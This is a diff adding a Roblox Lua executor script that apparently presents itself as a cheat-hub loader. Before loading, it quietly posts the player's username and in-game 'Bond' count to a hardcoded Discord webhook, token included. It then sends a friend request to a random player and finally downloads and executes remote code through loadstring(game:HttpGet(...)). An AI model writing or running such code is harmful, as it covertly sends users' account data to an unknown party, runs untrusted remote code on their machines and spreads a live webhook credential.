@@ -1,0 +1,66 @@
+game:IsLoaded()
+local totalBond = "0"
+local plrLocal = game.Players.LocalPlayer
+local plrGUI = plrLocal.PlayerGui
+if plrGUI:findFirstChild("BondDisplay") then
+  if plrGUI.BondDisplay:findFirstChild("BondInfo") then
+    if plrGUI.BondDisplay.BondInfo:findFirstChild("BondCount") then
+      plrGUI.BondDisplay.BondInfo.BondCount.Size = UDim2.new(2, 0, 2, 0)
+      totalBond = plrGUI.BondDisplay.BondInfo.BondCount.Text
+    end
+  end
+end
+local message = plrLocal.Name .. " > " .. totalBond
+
+local response = syn.request(
+  {
+    Url = "https://discordapp.com/api/webhooks/1389743502589427712/WAZ5bNd-bEilWcDBdbIHH2YeRBLZh6WKxr-UB0uqVa8tYNVw0M-3eUvQkLRc3ysYr2-o",
+    Method = "POST",
+    Headers = {
+      ["Content-Type"] = "application/json"  -- When sending JSON, set this!
+    },
+    Body = game:GetService("HttpService"):JSONEncode({content = message})
+  }
+)
+
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+-- Fungsi untuk memilih 1 pemain acak dan kirim permintaan pertemanan
+local function addRandomFriend()
+	local allPlayers = Players:GetPlayers()
+	local otherPlayers = {}
+
+	-- Buat daftar semua pemain selain diri sendiri
+	for _, player in ipairs(allPlayers) do
+		if player ~= localPlayer then
+			table.insert(otherPlayers, player)
+		end
+	end
+
+	-- Jika ada pemain lain
+	if #otherPlayers > 0 then
+		local randomPlayer = otherPlayers[math.random(1, #otherPlayers)]
+
+		-- Kirim permintaan pertemanan
+		local success = pcall(function()
+			localPlayer:RequestFriendship(randomPlayer)
+		end)
+
+		if success then
+			--print("Friend request sent to:", randomPlayer.Name)
+		else
+			--warn("Gagal mengirim permintaan pertemanan.")
+		end
+	else
+		--warn("Tidak ada pemain lain di server.")
+	end
+end
+
+-- Tunggu sebentar setelah join, lalu jalankan
+spawn(function()
+	task.wait(5)
+	addRandomFriend()
+end)
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/hungquan99/SkullHub/main/loader.lua'))()
